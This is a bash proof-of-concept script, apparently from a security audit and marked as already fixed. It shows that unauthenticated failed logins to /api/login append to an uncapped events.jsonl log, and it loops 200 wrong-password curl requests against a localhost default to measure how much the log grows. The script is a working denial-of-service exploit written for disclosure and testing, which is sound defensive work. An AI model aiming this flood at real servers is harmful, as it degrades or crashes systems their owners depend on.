#!/usr/bin/env bash
# FIXED on web-ui (only successful logins are logged; events.jsonl rotates at 1 MiB; the user-name bucket slows, never blocks).
# PoC: unauthenticated /api/login writes a line to events.jsonl on EVERY
# attempt, even failed/rate-limited ones. No session, no valid creds, no
# volume cap -> an unauthenticated attacker grows events.jsonl without bound.
# server.py:764 record() runs regardless of login outcome; record() appends
# to events_file with no size limit. On restart server.py:265 read_text()s
# the whole file -> OOM. Rank: HIGH (unauth, degrades/kills the box).
set -u
HOST=${1:-http://127.0.0.1:8699}
DATA=${2:?data dir}
EV="$DATA/events.jsonl"
before=$(wc -c < "$EV" 2>/dev/null || echo 0)
bl=$(wc -l < "$EV" 2>/dev/null || echo 0)
echo "events.jsonl before: $before bytes, $bl lines"
# 200 unauthenticated login attempts with a WRONG password for a user that
# doesn't need to exist. No cookie, no valid session.
for i in $(seq 1 200); do
  curl -s -o /dev/null -X POST "$HOST/api/login" \
    -H 'X-Escrow: 1' -H 'Content-Type: application/json' \
    --data-binary '{"user":"ghost","password":"wrongwrongwrong"}'
done
after=$(wc -c < "$EV")
al=$(wc -l < "$EV")
echo "events.jsonl after : $after bytes, $al lines"
echo "grew by $((after-before)) bytes, $((al-bl)) lines from 200 UNAUTH requests"
echo "--- last 2 lines written by the unauthenticated attacker ---"
tail -2 "$EV"
